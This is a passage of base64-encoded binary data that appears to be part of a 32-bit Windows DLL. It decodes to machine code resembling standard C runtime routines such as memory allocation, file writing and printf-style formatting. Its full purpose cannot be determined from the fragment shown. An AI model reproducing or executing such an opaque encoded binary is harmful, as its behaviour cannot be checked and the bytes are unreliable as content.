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DxAxdwggAVYvsi0UIhcB0EoPoCIE43d0AAHUHUOhWtv//WV3DVYvsU1ZXM/+74wAAAI0EO5krwovw0f5qVf809egmARD/dQjonAAAAIPEDIXAdBN5BY1e/+sDjX4BO/t+0IPI/+sHiwT17CYBEF9eW13DVYvsg30IAHQd/3UI6KH///9ZhcB4ED3kAAAAcwmLBMXIHwEQXcMzwF3DVYvsoRCiARAzBQhwARB0GzPJUVFR/3Uc/3UY/3UU/3UQ/3UM/3UI/9Bdw/91HP91GP91FP91EP91DP91COiU////WVD/FfwAARBdw1WL7FaLdRAzwIX2dF6LTQxTV4t9CGpBW2paWiv5iVUQ6wNqWloPtwQPZjvDcg1mO8J3CIPAIA+30OsCi9APtwFmO8NyDGY7RRB3BoPAIA+3wIPBAk50CmaF0nQFZjvQdMEPt8gPt8JfK8FbXl3DzMzMzMzMzMzMzMzMzMyAeg4FdRFmi51c////gM8CgOf+sz/rBGa7PxNmiZ1e////2a1e////u2xAARDZ5YmVbP///5vdvWD////GhXD///8Am4qNYf///9Dh0PnQwYrBJA/XD77AgeEEBAAAi9oD2IPDEP8jgHoOBXURZoudXP///4DPAoDn/rM/6wRmuz8TZomdXv///9mtXv///7tsQAEQ2eWJlWz///+b3b1g////xoVw////ANnJio1h////2eWb3b1g////2cmKrWH////Q5dD90MWKxSQP14rg0OHQ+dDBisEkD9fQ5NDkCsQPvsCB4QQEAACL2gPYg8MQ/yPowQAAANnJ3djD6LcAAADr9t3Y3djZ7sPd2N3Y2ejD271i////261i////9oVp////QHQIxoVw////B8PGhXD///8B3AVkQAEQw9nJ271i////261i////9oVp////QHQJxoVw////B+sHxoVw////Ad7Bw9u9Yv///9utYv////aFaf///0B0INnJ271i////261i////9oVp////QHQJxoVw////B+sHxoVw////Ad7Bw93Y3djbLVBAARCAvXD///8AfwfGhXD///8BCsnDCsl0Atngw8zMzMzMzFWL7IPE4IlF4ItFGIlF8ItFHIlF9OsJVYvsg8TgiUXg3V34iU3ki0UQi00UiUXoiU3sjUUIjU3gUFFS6Bw0AACDxAzdRfhmgX0IfwJ0A9l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CIXwBOI1F9FDrWg++wlDoKBgAAFmFwHREi4Uw5f//i5Us5f//K8IDRRCD+AEPhtsBAABqAlKNhTTl//9Q6McxAACDxAyD+P8PhAUDAACLhSzl//9A/4VA5f//6yZqAf+1LOX//42FNOX//1DomDEAAIPEDIP4/w+E1gIAAIuFLOX//zPJQP+FQOX//1FRagWJhSzl//+NRfRQagGNhTTl//9QUf+1EOX///8VdAABEImFPOX//4XAD4SVAgAAagCNjTjl//9Ri40k5f//UI1F9FCLhSjl//+LBIUQhwEQ/zQB/xUsAAEQhcAPhEwBAACLtUDl//+LjUTl//8D8YuFPOX//zmFOOX//w+MSQIAADm9GOX//3RLi40k5f//jYU45f//agBQagGNRfTGRfQNUIuFKOX//4sEhRCHARD/NAH/FSwAARCFwA+E7QAAAIO9OOX//wEPjPcBAAD/hUTl//9Gi4005f//6YYAAACA+wF0BYD7AnUzD7cIM9JmO40U5f//iY005f//D5TCg8ACiZU85f//i5VA5f//g8ICiYUs5f//iZVA5f//gPsBdAWA+wJ1S1HoZjAAAFmLjTTl//9mO8F1dYPGAjm9POX//3Qiag1YUImFNOX//+hAMAAAWYuNNOX//2Y7wXVPRv+FROX//4uVQOX//4uFLOX//ztVEA+Cqf3//+lFAQAAi50o5f//RooCi5Uk5f//iwydEIcBEIhECjSLBJ0QhwEQx0QCOAEAAADpFwEAAP8VHAABEIv46QoBAACLhSjl//+LDIUQhwEQi4Uk5f//9kQIBIAPhHUDAACLlTDl//8z/4m9NOX//4TbD4UOAQAAi10QiZU45f//hdsPhI0DAAAzyY299Ov//4vCiY085f//K4Uw5f//O8NzRIoKQkCIjR/l//+A+QqJlTjl//+LjTzl//91C/+FROX//8YHDUdBipUf5f//iBdHi5U45f//QYmNPOX//4H5/xMAAHK4i40k5f//jYX06///K/iNhSDl//9qAFBXjYX06///UIuFKOX//4sEhRCHARD/NAH/FSwAARCFwA+EE////wO1IOX//zm9IOX//3wWi5U45f//i8IrhTDl//87ww+CQf///4u9NOX//4uNROX//4X2D4X1AgAAhf8PhKwCAABqBVs7+w+FmAIAAOhEt///xwAJAAAA6AW3//+JGOnGAgAAi8qA+wIPheoAAAA5dRAPhnwCAADHhRTl//8KAAAAg6UY5f//AI2d9Ov//4vBag0rwouVGOX//147RRBzMw+3OYPAAoPBAmY7vRTl//91EIOFROX//wJmiTODwwKDwgJmiTuDwgKDwwKB+v4TAAByyI2F9Ov//4mNPOX//4uNJOX//yvYagCNhSDl//9QU42F9Ov//1CLhSjl//+LBIUQhwEQ/zQB/xUsAAEQi7VA5f//i7005f//hcAPhPL9//8DtSDl//+JtUDl//85nSDl//8PjPH+//+LjTzl//+LwYuVMOX//yvCO0UQD4Iu////6dP+//+LXRCJjTjl//+F2w+EigEAAMeFFOX//woAAACDpRjl//8AjYVI5f//i7045f//K8qLlRjl//87y3M7D7c3g8ECg8cCib045f//Zju1FOX//3USag1fZok4g8ACi7045f//g8ICZokwg8ICg8ACgfqoBgAAcsEz9o2NnPL//1ZWaFUNAABRjY1I5f//K8GZK8LR+FCLwVBWaOn9AAD/FXQAARCLtUDl//+LvTTl//+JhTzl//+FwA+EAP3//zPJiY1A5f//agArwY2VIOX//1JQjYWc8v//A8GLjSTl//9Qi4Uo5f//iwSFEIcBEP80Af8VLAABEIXAdB6LjUDl//8DjSDl//+LhTzl//+JjUDl//87wX+v6xr/FRwAARCLjUDl//+L+IuFPOX//4m9NOX//zvBD4+a/f//i4045f//i/GLlTDl//8r8om1QOX//zvzD4LE/v//6Xf9//9qAI2VIOX//1L/dRD/tTDl////NAj/FSwAARCFwA+EPfz//4u1IOX//zP/6Uf9//9X6Iq0//9Z6zyLlTDl//+LhSjl//+LjSTl//+LBIUQhwEQ9kQBBEB0CYA6GnUEM8DrHOh6tP//xwAcAAAA6Du0//+DIACDyP/rBCvxi8Zbi038XzPNXugyg///i+Vdw2oYaNhgARDoEqP//4PO/4l12Il13It9CIP//nUY6Pyz//+DIADoKLT//8cACQAAAOm9AAAAhf8PiJ0AAAA7PSSiARAPg5EAAACLx8H4BYlF5Ivfg+MfweMGiwSFEIcBEA++RBgEg+ABdHBX6JgoAABZg2X8AItF5IsEhRCHARD2RBgEAXQY/3UU/3UQ/3UMV+hnAAAAg8QQi/CL2usV6K+z///HAAkAAADocLP//4MgAIveiXXYiV3cx0X8/v///+gNAAAAi9PrK4t9CItd3It12FfoqykAAFnD6D+z//+DIADoa7P//8cACQAAAOjbr///i9aLxuhoov//w1WL7FFRVot1CFdW6BApAACDz/9ZO8d1Eeg5s///xwAJAAAAi8eL1+tE/3UUjU34Uf91EP91DFD/FQgBARCFwHUP/xUcAAEQUOjosv//WevTi8aD5h/B+AXB5gaLBIUQhwEQgGQwBP2LRfiLVfxfXovlXcNVi+z/BSCRARBWvgAQAABW6AOh//9Zi00IiUEIhcB0CYNJDAiJcRjrEYNJDASNQRSJQQjHQRgCAAAAi0EIg2EEAIkBXl3DVYvsgeyAAgAAoQhwARAzxYlF/ItFCI2NkP3//1NWiYXQ/f//i0UMV/91EIt9FImF8P3//zPAi9iJveT9//+Jhaz9//+L8Imd6P3//4mFwP3//4mF3P3//4mFzP3//4mFsP3//4mFuP3//4mFvP3//+hssf//6COy//+JhaT9//+LhdD9//+FwA+EsgoAAPZADEB1Y1Do5fP//1mLyIP5/3QZg/n+dBSL0cH4BYPiH8HiBgMUhRCHARDrBbrwcgEQ9kIkfw+FdgoAAIP5/3QZg/n+dBSLwYPhH8H4BcHhBgMMhRCHARDrBbnwcgEQ9kEkgA+FSQoAAIuV8P3//4XSD4Q7CgAAihIzwImF2P3//4vIiY3g/f//iYXI/f//iYWo/f//iJXv/f//iJW0/f//hNIPhB4KAACLhfD9//9AiYXw/f//hckPiOUJAACNQuA8WHcPD77CD7aA+EcBEIPgD+sCM8CLvcj9//9rwAkPtrw4GEgBEIvHib3I/f//i73k/f//wegEiYXI/f//g/gID4SrCQAAg/gHD4d3CQAA/ySFo60AEDPAg43c/f///4vYiYWw/f//iYW4/f//iYXA/f//iYXM/f//iZ3o/f//iYW8/f//6TwJAAAPvsKD6CB0RoPoA3Q5g+gIdC9ISHQdg+gDi4Xw/f//D4UdCQAAg8sIiZ3o/f//6Q8JAACDywSJnej9///p+wgAAIPLAevwgcuAAAAA6+iDywLr44D6KnUviweDxwSJveT9//+JhcD9//+FwA+JywgAAIPLBPfYiZ3o/f//iYXA/f//6bUIAABrjcD9//8KD77Cg8HQA8GJhcD9///plQgAADPAiYXc/f//6Y4IAACA+ip1K4sHg8cEiYXc/f//hcCLhfD9//+JveT9//8PiXAIAACDjdz9////6WQIAABrjdz9//8KD77Cg8HQA8GJhdz9///pPggAAID6SXRFgPpodDiLhfD9//+A+mx0FID6dw+FLAgAAIHLAAgAAOkH////gDhsdQxAgcsAEAAA6fb+//+DyxDp7v7//4PLIOn0/v//i4Xw/f//igA8NnUci73w/f//gH8BNHUQi8eDwAKBywCAAADpvv7//zwzdRyLvfD9//+AfwEydRCLx4PAAoHj/3///+me/v//PGQPhKoHAAA8aQ+EogcAADxvD4SaBwAAPHUPhJIHAAA8eA+EigcAADxYD4SCBwAAM8CJhcj9///rAjPAiYW8/f//jYWQ/f//UA+2wlDoLQwAAFlZhcB0OI2F4P3//1D/tdD9////tbT9///oyQcAAIuN8P3//4PEDIoBQYiFtP3//4mN8P3//4TAD4RNBwAAjYXg/f//UP+10P3///+1tP3//+iRBwAAg8QM6fwGAAAPvsKD+GQPj80BAAAPhFECAACD+FMPj+0AAAB0fIPoQXQQSEh0VkhIdAhISA+FGAUAAIDCIMeFsP3//wEAAACIle/9//+Lhdz9//+NtfT9//+Dy0C5AAIAAImd6P3//4mNxP3//4XAD4kyAgAAx4Xc/f//BgAAAOmAAgAA98MwCAAAD4WeAAAAgcsACAAAiZ3o/f//6Y0AAAD3wzAIAAB1DIHLAAgAAImd6P3//4uV3P3//7n///9/g/r/dAKLyos3g8cEib3k/f//98MQCAAAD4RTBAAAhfZ1Bos1dHEBEMeFvP3//wEAAACLxoXJdA8z0klmORB0B4PAAoXJdfMrxtH46TwEAACD6FgPhLACAABISHRwg+gHD4Qn////SEgPhSQEAACDxwSJveT9///3wxAIAAB0MA+3R/xQaAACAACNhfT9//9QjYXY/f//UOj/CwAAg8QQhcB0H8eFuP3//wEAAADrE4pH/IiF9P3//8eF2P3//wEAAACNtfT9///pxQMAAIsHg8cEib3k/f//hcB0M4twBIX2dCwPvwD3wwAIAAB0FJkrwseFvP3//wEAAADR+OmKAwAAM8mJjbz9///pfQMAAIs1cHEBEFboI43//1npawMAAIP4cA+P4wEAAA+EzwEAAIP4ZQ+MWQMAAIP4Zw+OS/7//4P4aXRkg/hudCWD+G8PhT0DAADHhdj9//8IAAAAhNt5W4HLAAIAAImd6P3//+tNg8cEib3k/f//i3/86OAJAACFwA+E6wQAAIuF4P3///bDIHQFZokH6wKJB8eFuP3//wEAAADpegQAAIPLQImd6P3//8eF2P3//woAAAD3wwCAAAB1DPfDABAAAA+EjgEAAIsPg8cIib3k/f//M/aLf/zprgEAAHURgPpndVbHhdz9//8BAAAA60o7wX4Ii8GJhdz9//89owAAAH43jbhdAQAAV+jumf//ipXv/f//iYWo/f//WYXAdAqL8Im9xP3//+sKx4Xc/f//owAAAIu95P3//4sHg8cIiYWA/f//ib3k/f//i0f8iYWE/f//jYWQ/f//UP+1sP3//w++wv+13P3//1D/tcT9//+NhYD9//9WUP81WHMBEP8VSAABEP/Qi/uDxByB54AAAAB0IYO93P3//wB1GI2FkP3//1BW/zVkcwEQ/xVIAAEQ/9BZWYC97/3//2d1HIX/dRiNhZD9//9QVv81YHMBEP8VSAABEP/QWVmAPi0PhSj+//+BywABAABGiZ3o/f//6Rb+///Hhdz9//8IAAAAagfrHIPocw+E3/z//0hID4SW/v//g+gDD4VrAQAAaifHhdj9//8QAAAAWImF